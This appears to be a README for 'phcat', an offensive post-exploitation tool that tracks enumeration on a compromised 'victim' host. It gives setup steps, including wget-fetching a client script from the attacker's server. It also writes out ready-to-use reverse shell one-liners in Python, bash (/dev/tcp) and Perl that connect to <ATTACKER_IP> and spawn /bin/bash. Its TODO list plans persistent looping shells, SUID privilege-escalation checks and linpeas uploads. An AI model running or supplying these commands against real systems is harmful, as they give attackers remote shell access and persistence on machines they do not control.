# Description
phcat automates and keeps track of what enumeration you've done on the victim system and provides hints on vulnerabilities, misconfigurations, or other interesting facts about your victim host. phcat aspires to automate exploitation as well in a near future, similarly -- but worse -- than Caleb Stewarts's pwncat. The entry point is a reverse shell which is implemented using Gallopsled's pwntools.

# Screenshots
![phcat screenshot 1](/screenshots/screenshot1.png)
![phcat screenshot 2](/screenshots/screenshot2.png)
![phcat screenshot 3](/screenshots/screenshot3.png)
![phcat screenshot 4](/screenshots/screenshot4.png)

# Steps using HTTP web server
1. (on attacker): python3 http_server.py
2. (on victim): wget <ATTACKER_IP>:8000/victim_client_<ATTACKER_IP>.py
3. (on attacker): python3 listener.py -v <VICTIM_IP>
4. (on victim): python3 victim_client_<ATTACKER_IP>.py

# Steps using reverse shell one-liner
1. (on attacker): python3 listener.py -v <VICTIM_IP>
2. Reverse shell one-liners (on victim)
    - [python2]: python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
    - [bash]: bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1
    - [perl]: perl -e 'use Socket;$i="<ATTACKER_IP>";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

# TODO
- (Low) Create several implementations for looping reverse shells in case python isn't available  
  - (Low) Implement "persisting" looping reverse shell install  
- (Low) Implement menu with list of playbooks that can be run for enumeration, privesc, etc  
    - (Low) Have menu items show if an error occured of if the playbook results are already available  
    - show enumerate  
      [ ] 1. Check SUID binaries  
    - use enumerate 1  
    - show network  
      [ ] 1. Local IPv4s  
      [X] 2. Connected subnets  
      [ ] 3. Reachable online hosts  
    - show network 2  
- (Low) Upload and run linpeas.sh, save locally. Make it as part of the menu of things to run.  
- (Low) Better logging with colors and stuff!
- (Low) When checking SUID files, compare against pre-built list of 'known' default install binaries. Also check creation dates for clues.
